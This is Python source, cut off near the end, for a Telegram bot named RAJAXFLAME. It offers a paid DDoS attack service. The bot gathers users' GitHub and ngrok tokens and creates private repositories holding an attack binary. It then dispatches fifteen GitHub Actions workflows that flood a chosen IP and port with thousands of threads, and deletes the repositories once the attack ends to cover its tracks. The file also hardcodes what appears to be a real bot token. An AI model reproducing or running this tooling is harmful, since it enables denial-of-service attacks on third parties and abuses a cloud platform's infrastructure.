import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
    InputMediaPhoto,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ================ 🌟 CONFIGURATION 🌟 ================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8457763206:AAE_o4kb-RRjA0ChqVFHc8t_6Qd7vcHXo1A")
DEVELOPER_TAG = "@BITCH_lI_mBACK"
OWNER_IDS = {7848273230}

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
GITHUB_TOKENS_FILE = "github_tokens.txt"
NGROK_TOKENS_FILE = "ngrok_tokens.txt"
ATTACK_LOGS_FILE = "attack_logs.json"
TOKENS_STATUS_FILE = "tokens_status.json"
DEFAULT_THREADS_FILE = "threads.json"

BINARY_NAME = "rajaxflame"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)

# Tracking
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}
ACTIVE_TUNNELS: Dict[int, Any] = {}
ATTACK_LOGS: List[Dict[str, Any]] = []

# ================ 🎨 STYLISH DESIGN CONSTANTS 🎨 ================
BANNERS = {
    "welcome": """
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA INSTANT**      ║
║    💥 **10x WORKFLOWS**     ║
╚══════════════════════════════╝
    """,
    "attack_start": """
╔══════════════════════════════╗
║    🎯 **RAJAXFLAME FIRED**   ║
║    ⚡ **INSTANT STRIKE**     ║
║    🔥 **NGROK TUNNEL**      ║
╚══════════════════════════════╝
    """,
    "status": """
╔══════════════════════════════╗
║    📊 **RAJAXFLAME STATUS**  ║
║    🔥 **REAL-TIME**         ║
╚══════════════════════════════╝
    """,
    "control": """
╔══════════════════════════════╗
║    🎮 **RAJAXFLAME CONTROL** ║
║    ⚡ **FULL MANAGEMENT**    ║
╚══════════════════════════════╝
    """,
    "tunnel": """
╔══════════════════════════════╗
║    🌐 **TUNNEL STATUS**      ║
║    🔥 **COMPLETE REPORT**    ║
╚══════════════════════════════╝
    """,
    "create": """
╔══════════════════════════════╗
║    🔗 **TUNNEL CREATION**    ║
║    🌐 **MULTI-TOKEN**        ║
╚══════════════════════════════╝
    """
}

ANIME_PICS = [
    "https://wallpapercave.com/wp/wp13025001.jpg",
    "https://wallpapercave.com/wp/wp13024996.jpg",
    "https://wallpapercave.com/wp/wp13024994.jpg",
    "https://wallpapercave.com/wp/wp13024992.jpg"
]

# ================ 🔧 UTILITIES 🔧 ================
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

# ================ 🔐 TOKEN MANAGEMENT 🔐 ================
def save_github_token(uid: int, token: str) -> None:
    # Remove duplicates and dead tokens first
    clean_github_tokens()
    with open(GITHUB_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def save_ngrok_token(uid: int, token: str) -> None:
    # Remove duplicates and dead tokens first
    clean_ngrok_tokens()
    with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_github_tokens() -> List[str]:
    if not os.path.exists(GITHUB_TOKENS_FILE):
        return []
    with open(GITHUB_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def load_ngrok_tokens() -> List[str]:
    if not os.path.exists(NGROK_TOKENS_FILE):
        return []
    with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def get_user_github_tokens(user_id: int) -> List[str]:
    return [ln.split(":", 1)[1] for ln in load_github_tokens() if ln.startswith(f"{user_id}:")]

def get_user_ngrok_tokens(user_id: int) -> List[str]:
    return [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]

def validate_github_token(token: str) -> bool:
    try:
        r = requests.get("https://api.github.com/user", headers=gh_headers(token), timeout=20)
        return r.status_code == 200
    except:
        return False

def validate_ngrok_token(token: str) -> bool:
    try:
        r = requests.get(
            "https://api.ngrok.com/credentials",
            headers=ngrok_headers(token),
            timeout=20
        )
        return r.status_code == 200
    except:
        return False

def clean_github_tokens() -> None:
    """Remove duplicate and dead GitHub tokens"""
    tokens = load_github_tokens()
    unique_tokens = {}
    for line in tokens:
        uid, token = line.split(":", 1)
        if validate_github_token(token):  # Only keep live tokens
            unique_tokens[token] = uid
    with open(GITHUB_TOKENS_FILE, "w", encoding="utf-8") as f:
        for token, uid in unique_tokens.items():
            f.write(f"{uid}:{token}\n")

def clean_ngrok_tokens() -> None:
    """Remove duplicate and dead ngrok tokens"""
    tokens = load_ngrok_tokens()
    unique_tokens = {}
    for line in tokens:
        uid, token = line.split(":", 1)
        if validate_ngrok_token(token):  # Only keep live tokens
            unique_tokens[token] = uid
    with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
        for token, uid in unique_tokens.items():
            f.write(f"{uid}:{token}\n")

# ================ 🌐 GITHUB API FUNCTIONS 🌐 ================
def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.github.com/user/repos",
            headers=gh_headers(token),
            json={"name": name, "private": True, "auto_init": False},
            timeout=30
        )
        return r.json() if r.status_code in (201, 202) else None
    except:
        return None

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    try:
        b64 = base64.b64encode(content_bytes).decode()
        r = requests.put(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=gh_headers(token),
            json={"message": message, "content": b64},
            timeout=30
        )
        return r.status_code in (201, 200)
    except:
        return False

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    try:
        r = requests.post(
            f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
            headers=gh_headers(token),
            json={"ref": ref},
            timeout=30
        )
        return r.status_code in (204, 201)
    except:
        return False

def gh_delete_repo(token: str, full_name: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.github.com/repos/{full_name}",
            headers=gh_headers(token),
            timeout=30
        )
        return r.status_code == 204
    except:
        return False

# ================ 🔗 NGROK API FUNCTIONS 🔗 ================
def ngrok_headers(token: str) -> Dict[str, str]:
    return {
        "Authorization": f"Bearer {token}", 
        "Content-Type": "application/json",
        "Ngrok-Version": "2"
    }

def extract_tunnel_url(tunnel_data: Dict[str, Any]) -> str:
    """Extract tunnel URL with multiple fallbacks"""
    url_fields = ['public_url', 'uri', 'endpoint', 'tunnel_url', 'url', 'public_urls']
    
    for field in url_fields:
        if field in tunnel_data:
            url = tunnel_data[field]
            if url:
                if isinstance(url, str):
                    if 'ngrok.io' in url or 'ngrok-free.app' in url:
                        return url
                elif isinstance(url, list) and len(url) > 0:
                    return url[0]
    
    if 'endpoints' in tunnel_data and tunnel_data['endpoints']:
        return extract_tunnel_url(tunnel_data['endpoints'][0])
    
    return "tcp://ngrok.io:XXXXX (URL extracting...)"

def create_ngrok_tunnel(token: str, port: int = 80) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.ngrok.com/tunnels",
            headers=ngrok_headers(token),
            json={
                "name": f"rajaxflame-tunnel-{random.randint(1000,9999)}",
                "proto": "tcp",
                "addr": f"{port}",
                "metadata": f"rajaxflame-{int(time.time())}"
            },
            timeout=30
        )
        if r.status_code == 201:
            return r.json()
        else:
            return create_ngrok_tunnel_alternative(token, port)
    except Exception as e:
        logging.error(f"Ngrok tunnel creation error: {e}")
        return None

def create_ngrok_tunnel_alternative(token: str, port: int):
    """Alternative ngrok tunnel creation method"""
    try:
        r = requests.post(
            "https://api.ngrok.com/endpoints",
            headers=ngrok_headers(token),
            json={
                "description": f"rajaxflame-{int(time.time())}",
                "metadata": "rajaxflame-tunnel",
                "proto": "tcp",
                "addr": f"{port}"
            },
            timeout=30
        )
        return r.json() if r.status_code == 201 else None
    except Exception as e:
        logging.error(f"Alternative ngrok failed: {e}")
        return None

def delete_ngrok_tunnel(token: str, tunnel_id: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.ngrok.com/tunnels/{tunnel_id}",
            headers=ngrok_headers(token),
            timeout=20
        )
        return r.status_code == 204
    except:
        return False

# ================ ⚡ INSTANT WORKFLOW BUILDERS ⚡ ================
def build_instant_workflows(tunnel_url: str, port: str, duration: str, threads: int) -> Dict[str, str]:
    """Build 15 instant workflows for maximum power"""
    workflows = {}
    
    # Extract host and port from tunnel URL
    if "tcp://" in tunnel_url:
        tunnel_host = tunnel_url.replace("tcp://", "").split(":")[0]
        tunnel_port = tunnel_url.split(":")[-1] if ":" in tunnel_url else "443"
    else:
        tunnel_host = tunnel_url
        tunnel_port = port

    # 🚀 ULTRA INSTANT WORKFLOWS - 15x POWER
    workflow_configs = {
        "instant_wave1.yml": {"name": "⚡ INSTANT WAVE 1", "threads": threads, "runners": 3},
        "instant_wave2.yml": {"name": "🔥 INSTANT WAVE 2", "threads": threads + 1000, "runners": 2},
        "instant_wave3.yml": {"name": "💥 INSTANT WAVE 3", "threads": threads + 2000, "runners": 4},
        "instant_wave4.yml": {"name": "🚀 INSTANT WAVE 4", "threads": threads + 1500, "runners": 3},
        "instant_wave5.yml": {"name": "🌪️ INSTANT WAVE 5", "threads": threads + 2500, "runners": 2},
        "instant_wave6.yml": {"name": "⚡ INSTANT WAVE 6", "threads": threads + 1800, "runners": 4},
        "instant_wave7.yml": {"name": "🔥 INSTANT WAVE 7", "threads": threads + 2200, "runners": 3},
        "instant_wave8.yml": {"name": "💥 INSTANT WAVE 8", "threads": threads + 3000, "runners": 2},
        "instant_wave9.yml": {"name": "🚀 INSTANT WAVE 9", "threads": threads + 2800, "runners": 4},
        "instant_wave10.yml": {"name": "🌪️ INSTANT WAVE 10", "threads": threads + 3500, "runners": 3},
        "instant_ultra1.yml": {"name": "🎯 ULTRA WAVE 1", "threads": threads + 4000, "runners": 5},
        "instant_ultra2.yml": {"name": "💀 ULTRA WAVE 2", "threads": threads + 4500, "runners": 4},
        "instant_ultra3.yml": {"name": "☠️ ULTRA WAVE 3", "threads": threads + 5000, "runners": 6},
        "instant_mega1.yml": {"name": "👻 MEGA WAVE 1", "threads": threads + 6000, "runners": 5},
        "instant_mega2.yml": {"name": "🤖 MEGA WAVE 2", "threads": threads + 7000, "runners": 6}
    }
    
    for wf_file, config in workflow_configs.items():
        wf_config = {
            "name": config["name"],
            "on": {
                "workflow_dispatch": {}
            },
            "jobs": {
                f"attack-{random.randint(1000,9999)}": {
                    "runs-on": f"ubuntu-latest",
                    "strategy": {
                        "matrix": {
                            "instance": list(range(1, config["runners"] + 1))
                        }
                    },
                    "steps": [
                        {
                            "name": "⚡ RAJAXFLAME SETUP",
                            "uses": "actions/checkout@v4"
                        },
                        {
                            "name": "🔧 PREPARE BINARY",
                            "run": f"chmod +x {BINARY_NAME} && ls -la"
                        },
                        {
                            "name": f"🎯 {config['name']} - Runner ${{{{ matrix.instance }}}}",
                            "run": f"timeout {duration} ./{BINARY_NAME} {tunnel_host} {tunnel_port} {duration} {config['threads']} || true"
                        }
                    ]
                }
            }
        }
        workflows[wf_file] = yaml.dump(wf_config, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    return workflows

# ================ 🎭 ANIMATION & DESIGN 🎭 ================
async def send_rajaxflame_message(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error sending message: {e}")

async def send_rajaxflame_photo(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        profile_pic = random.choice(ANIME_PICS)
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=profile_pic,
            caption=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception:
        await send_rajaxflame_message(context, chat_id, text, banner_type, reply_markup)

async def animate_instant_progress(context, chat_id: int, duration: int):
    progress_bars = [
        "🟥⬜⬜⬜⬜⬜⬜⬜⬜⬜ 10%",
        "🟥🟥⬜⬜⬜⬜⬜⬜⬜⬜ 20%",
        "🟥🟥🟥⬜⬜⬜⬜⬜⬜⬜ 30%",
        "🟥🟥🟥🟥⬜⬜⬜⬜⬜⬜ 40%",
        "🟥🟥🟥🟥🟥⬜⬜⬜⬜⬜ 50%",
        "🟥🟥🟥🟥🟥🟥⬜⬜⬜⬜ 60%",
        "🟥🟥🟥🟥🟥🟥🟥⬜⬜⬜ 70%",
        "🟥🟥🟥🟥🟥🟥🟥🟥⬜⬜ 80%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥⬜ 90%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥 100%"
    ]
    msg = await context.bot.send_message(chat_id, "🔥 **INSTANT ATTACK PROGRESS STARTING...**")
    interval = max(1, duration / len(progress_bars))
    for progress in progress_bars:
        await asyncio.sleep(interval)
        try:
            await msg.edit_text(f"⏳ **INSTANT PROGRESS:** {progress}")
        except Exception:
            pass
    return msg

# ================ 🔗 CREATE TUNNEL COMMAND 🔗 ================
async def cmd_create(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create ngrok tunnel only"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_user_approved(user_id):
        await send_rajaxflame_message(
            context, chat_id,
            f"❌ **ACCESS DENIED**\n\nContact Developer: {DEVELOPER_TAG}",
            "status"
        )
        return
    
    # Get port from command arguments
    if len(context.args) != 1:
        await send_rajaxflame_message(
            context, chat_id,
            "💡 **USAGE:** `/create PORT`\n\nExample: `/create 80`",
            "status"
        )
        return
    
    try:
        port = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ PORT must be a valid number")
        return
    
    # Clean tokens first
    clean_ngrok_tokens()
    
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    if not valid_ngrok:
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **NO VALID NGROK TOKENS**\n\nUse /setngrok to add tokens first",
            "status"
        )
        return
    
    create_msg = await update.message.reply_text("🔗 **CREATING NGROK TUNNELS...**")
    
    # 🚀 MULTIPLE TUNNEL CREATION
    successful_tunnels = []
    
    for i, ngrok_token in enumerate(valid_ngrok, 1):
        await create_msg.edit_text(f"🔗 Creating tunnel {i}/{len(valid_ngrok)}...")
        
        try:
            tunnel_data = create_ngrok_tunnel(ngrok_token, port)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id') or f"tunnel-{random.randint(1000,9999)}"
                
                # Store tunnel info
                tunnel_key = f"{chat_id}_{ngrok_token[:8]}"
                ACTIVE_TUNNELS[tunnel_key] = {
                    'data': tunnel_data,
                    'token': ngrok_token,
                    'port': port,
                    'created_at': datetime.utcnow().isoformat()
                }
                
                successful_tunnels.append({
                    'url': tunnel_url,
                    'id': tunnel_id,
                    'token_preview': ngrok_token[:12] + "..."
                })
                
                # Send individual tunnel status
                tunnel_status_msg = f"""
🌐 **TUNNEL CREATED SUCCESSFULLY!**

🔗 **URL:** `{tunnel_url}`
🎯 **Port:** {port}
🆔 **ID:** `{tunnel_id}`
⏰ **Created:** {datetime.utcnow().strftime('%H:%M:%S UTC')}
📊 **Status:** ✅ ACTIVE
🔑 **Token:** `{ngrok_token[:12]}...`
🔢 **Sequence:** {i}/{len(valid_ngrok)}
"""
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=tunnel_status_msg,
                    parse_mode='HTML'
                )
                
            else:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"❌ **Failed to create tunnel with token {ngrok_token[:12]}...**",
                    parse_mode='HTML'
                )
                
        except Exception as e:
            error_msg = f"⚠️ **TUNNEL CREATION FAILED FOR TOKEN {ngrok_token[:12]}...**: {str(e)}"
            await context.bot.send_message(chat_id=chat_id, text=error_msg)
    
    # Final summary
    if successful_tunnels:
        summary_msg = f"""
🎉 **TUNNEL CREATION COMPLETED!**

📊 **SUMMARY:**
✅ Successful: {len(successful_tunnels)}
❌ Failed: {len(valid_ngrok) - len(successful_tunnels)}
🎯 Total Tokens: {len(valid_ngrok)}
🔗 Active Tunnels: {len(successful_tunnels)}

🌐 **CREATED TUNNELS:**
"""
        for i, tunnel in enumerate(successful_tunnels, 1):
            summary_msg += f"{i}. `{tunnel['url']}` (Token: {tunnel['token_preview']})\n"
        
        summary_msg += f"\n💡 **Use these tunnels in attack with /attack command**"
        
        await create_msg.delete()
        await send_rajaxflame_photo(context, chat_id, summary_msg, "create")
    else:
        await create_msg.edit_text("❌ **ALL TUNNEL CREATIONS FAILED**\n\nCheck your ngrok tokens and try again.")

# ================ 🎯 INSTANT ATTACK HANDLER 🎯 ================
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_user_approved(user_id):
        await send_rajaxflame_message(
            context, chat_id,
            f"❌ **ACCESS DENIED**\n\nContact Developer: {DEVELOPER_TAG}",
            "status"
        )
        return
    
    if len(context.args) != 3:
        await send_rajaxflame_message(
            context, chat_id,
            "💡 **USAGE:** `/attack IP PORT DURATION`\n\nExample: `/attack 1.1.1.1 80 120`",
            "status"
        )
        return
    
    ip, port, duration = context.args
    try:
        port = int(port)
        duration = int(duration)
        if duration > 300:
            await update.message.reply_text("❌ Duration must be 300 seconds or less")
            return
    except ValueError:
        await update.message.reply_text("❌ PORT and DURATION must be valid numbers")
        return
    
    if not os.path.exists(BINARY_PATH):
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **BINARY MISSING**\n\nAdmin must upload binary via /file command",
            "status"
        )
        return
    
    # Clean tokens before attack
    clean_github_tokens()
    clean_ngrok_tokens()
    
    github_tokens = get_user_github_tokens(user_id)
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    valid_github = [t for t in github_tokens if validate_github_token(t)]
    valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    if not valid_github:
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **NO VALID GITHUB TOKENS**\n\nUse /setgithub to add tokens first",
            "status"
        )
        return
    
    attack_msg = await update.message.reply_text("🔥 **INITIATING INSTANT MULTI-TOKEN ATTACK...**")
    
    # 🚀 MULTIPLE TUNNEL CREATION
    tunnel_urls = []
    tunnel_ids = []
    if valid_ngrok:
        await attack_msg.edit_text("🔗 **CREATING MULTIPLE INSTANT TUNNELS...**")
        for ngrok_token in valid_ngrok:
            try:
                tunnel_data = create_ngrok_tunnel(ngrok_token, port)
                if tunnel_data:
                    tunnel_url = extract_tunnel_url(tunnel_data)
                    if tunnel_url:
                        tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
                        ACTIVE_TUNNELS[f"{chat_id}_{ngrok_token[:8]}"] = {
                            'data': tunnel_data,
                            'token': ngrok_token
                        }
                        tunnel_urls.append(tunnel_url)
                        tunnel_ids.append(tunnel_id)
                        tunnel_status_msg = f"""
🌐 **INSTANT TUNNEL CREATED!**

🔗 **URL:** `{tunnel_url}`
🎯 **Target:** {ip}:{port}
⏰ **Created:** {datetime.utcnow().strftime('%H:%M:%S UTC')}
📊 **Status:** ✅ ACTIVE
🔑 **Ngrok Token:** `{ngrok_token[:12]}...`
"""
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=tunnel_status_msg,
                            parse_mode='HTML'
                        )
            except Exception as e:
                await attack_msg.edit_text(f"⚠️ **TUNNEL FAILED FOR TOKEN {ngrok_token[:12]}...**: {str(e)}")
    
    attack_target = random.choice(tunnel_urls) if tunnel_urls else ip
    target_port = attack_target.split(":")[-1] if tunnel_urls and ":" in attack_target else str(port)
    
    await attack_msg.edit_text("🔨 **BUILDING INSTANT WORKFLOWS...**")
    threads = get_default_threads()
    workflows = build_instant_workflows(attack_target, target_port, str(duration), threads)
    
    # 🚀 MULTIPLE REPO CREATION WITH ALL GITHUB TOKENS
    repo_data_list = []
    await attack_msg.edit_text("📁 **CREATING MULTIPLE INSTANT REPOSITORIES...**")
    for github_token in valid_github:
        repo_name = f"rajaxflame-{random.randint(100000, 999999)}"
        repo_data = gh_create_repo(github_token, repo_name)
        if repo_data:
            repo_data_list.append((github_token, repo_name, repo_data))
    
    if not repo_data_list:
        await attack_msg.edit_text("❌ **FAILED TO CREATE ANY REPOSITORIES**")
        return
    
    await attack_msg.edit_text("📦 **UPLOADING BINARY TO MULTIPLE REPOSITORIES...**")
    with open(BINARY_PATH, "rb") as f:
        binary_data = f.read()
    
    successful_repos = []
    for github_token, repo_name, repo_data in repo_data_list:
        owner = repo_data['owner']['login']
        full_repo_name = repo_data['full_name']
        if gh_put_file(github_token, owner, repo_name, BINARY_NAME, binary_data, "Add RAJAXFLAME binary"):
            successful_repos.append((github_token, repo_name, owner, full_repo_name))
        else:
            gh_delete_repo(github_token, full_repo_name)
    
    if not successful_repos:
        await attack_msg.edit_text("❌ **FAILED TO UPLOAD BINARY TO ANY REPOSITORY**")
        return
    
    await attack_msg.edit_text("⚡ **UPLOADING INSTANT WORKFLOWS TO ALL REPOSITORIES...**")
    successful_workflows = 0
    dispatched_workflows = 0
    for github_token, repo_name, owner, full_repo_name in successful_repos:
        for wf_name, wf_content in workflows.items():
            wf_path = f".github/workflows/{wf_name}"
            try:
                if gh_put_file(github_token, owner, repo_name, wf_path, wf_content.encode('utf-8'), f"Add {wf_name}"):
                    successful_workflows += 1
                    if gh_dispatch_workflow(github_token, owner, repo_name, wf_name):
                        dispatched_workflows += 1
            except Exception as e:
                logging.error(f"Error processing workflow {wf_name} for repo {repo_name}: {str(e)}")
    
    until_time = datetime.utcnow() + timedelta(seconds=duration + 30)
    ATTACK_STATUS[chat_id] = {
        "running": True,
        "until": until_time,
        "target": f"{attack_target}:{target_port}",
        "workflows_uploaded": successful_workflows,
        "workflows_dispatched": dispatched_workflows,
        "repos": [full_name for _, _, _, full_name in successful_repos],
        "start_time": datetime.utcnow().isoformat(),
        "github_tokens": [token[:8] + "..." for token in valid_github],
        "tunnel_used": bool(tunnel_urls),
        "tunnel_urls": tunnel_urls,
        "ngrok_tokens": [token[:8] + "..." for token in valid_ngrok]
    }
    
    ATTACK_LOGS.append({
        "user_id": user_id,
        "chat_id": chat_id,
        "target": f"{attack_target}:{target_port}",
        "duration": duration,
        "start_time": datetime.utcnow().isoformat(),
        "workflows": dispatched_workflows,
        "tunnels": tunnel_urls,
        "repos": len(successful_repos),
        "github_tokens_used": len(valid_github),
        "ngrok_tokens_used": len(valid_ngrok)
    })
    save_json(ATTACK_LOGS_FILE, ATTACK_LOGS)
    
    # 🎯 INSTANT SUCCESS REPORT
    total_runners = sum([3, 2, 4, 3, 2, 4, 3, 2, 4, 3, 5, 4, 6, 5, 6]) * len(successful_repos)
    success_report = f"""
🎯 **MULTI-TOKEN ATTACK DEPLOYED SUCCESSFULLY!**

📊 **INSTANT REPORT:**
✅ Repositories Created: {len(successful_repos)}
✅ Workflows Uploaded: {successful_workflows}
✅ Workflows Deployed: {dispatched_workflows}
🚀 Total Runners: {total_runners}
🎯 Target: `{attack_target}:{target_port}`
⏱ Duration: {duration} seconds
🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}

🔰 **MODE:** {'🔥 MULTI-TUNNEL + MULTI-REPO' if tunnel_urls else '⚡ MULTI-REPO DIRECT'}
📁 Repositories: {len(successful_repos)}
🔑 GitHub Tokens: {len(valid_github)} used
🌐 Ngrok Tunnels: {len(tunnel_urls)} active
💥 **MAXIMUM POWER ATTACK ACTIVATED!**
"""
    
    await attack_msg.delete()
    await send_rajaxflame_photo(context, chat_id, success_report, "attack_start")
    
    asyncio.create_task(animate_instant_progress(context, chat_id, duration))
    asyncio.create_task(instant_cleanup(chat_id, successful_repos, tunnel_ids, duration))

async def instant_cleanup(chat_id: int, repos: List[tuple], tunnel_ids: List[str], duration: int):
    await asyncio.sleep(duration + 15)
    try:
        for github_token, _, _, full_repo_name in repos:
            gh_delete_repo(github_token, full_repo_name)
    except Exception:
        pass
    for tunnel_id in tunnel_ids:
        if f"{chat_id}_{ACTIVE_TUNNELS[f'{chat_id}_{tunnel_id[:8]}']['token'][:8]}" in ACTIVE_TUNNELS:
            try:
                ngrok_token = ACTIVE_TUNNELS[f"{chat_id}_{tunnel_id[:8]}"]["token"]
                delete_ngrok_tunnel(ngrok_token, tunnel_id)
                del ACTIVE_TUNNELS[f"{chat_id}_{tunnel_id[:8]}"]
            except Exception:
                pass
    if chat_id in ATTACK_STATUS:
        ATTACK_STATUS[chat_id]["running"] = False
        await send_rajaxflame_message(None, chat_id, "🛑 **Attack Finished and Resources Cleaned Up**", "status")

# ================ 🎯 INSTANT RUN HANDLER 🎯 ================
async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_attack(update, context)  # Use the same logic as /attack for setup and instant launch

# ================ 🎪 COMMAND HANDLERS 🎪 ================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    welcome_text = f"""
✨ **WELCOME TO RAJAXFLAME v3.0** ✨

👤 **User:** {user.first_name}
🆔 **ID:** `{user.id}`
🔰 **Status:** {'✅ APPROVED' if is_user_approved(user.id) else '❌ PENDING'}

🔥 **INSTANT FEATURES:**
• Multi-Token Simultaneous Attack
• Auto Duplicate/Dead Token Removal
• Multiple Ngrok Tunnel Integration  
• Ultra Fast Deployment
• Professional UI/UX Design
• Real-time Status Updates

📚 **Commands:**
/setgithub - Add GitHub Tokens
/setngrok - Add Ngrok Tokens
/create - Create Ngrok Tunnels Only
/attack - Launch MULTI-TOKEN Attack
/run - Setup and Launch MULTI-TOKEN Attack
/status - Detailed Status Report
/tunnelstatus - Tunnel Status Report
/mytunnels - Your Active Tunnels
/control - Admin Control Panel
/logs - View Attack Logs

👨‍💻 **Developer:** {DEVELOPER_TAG}
    """
    await send_rajaxflame_photo(context, chat_id, welcome_text, "welcome")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🔥 **RAJAXFLAME v3.0 - COMMAND GUIDE**

🔹 **User Commands**
/start - Welcome message and bot info
/help - Show this command guide
/create PORT - Create Ngrok tunnels only
/attack IP PORT DURATION - Launch multi-token attack
/run IP PORT DURATION - Setup and launch multi-token attack
/status - View attack, user, and token status
/tunnelstatus - Detailed tunnel status
/mytunnels - Show your active tunnels
/setgithub - Add GitHub Personal Access Tokens
/setngrok - Add Ngrok Auth Tokens
/check - Validate GitHub and Ngrok tokens

🔹 **Admin Commands**
/control - Open admin control panel
/logs - View recent attack logs
/add USERID DAYS - Approve user
/remove USERID - Remove user
/threads NUMBER - Set default threads
/file - Upload rajaxflame binary
/stop - Stop ongoing attack

🔹 **Owner Commands**
/addadmin USERID - Add admin
/removeadmin USERID - Remove admin

👨‍💻 **Contact:** {DEVELOPER_TAG}
"""
    await send_rajaxflame_message(context, update.effective_chat.id, help_text, "welcome")

async def cmd_setgithub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        file = await update.message.document.get_file()
        path = await file.download_to_drive()
        count = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                token = line.strip()
                if token and len(token) > 10:
                    save_github_token(user_id, token)
                    count += 1
        os.remove(path)
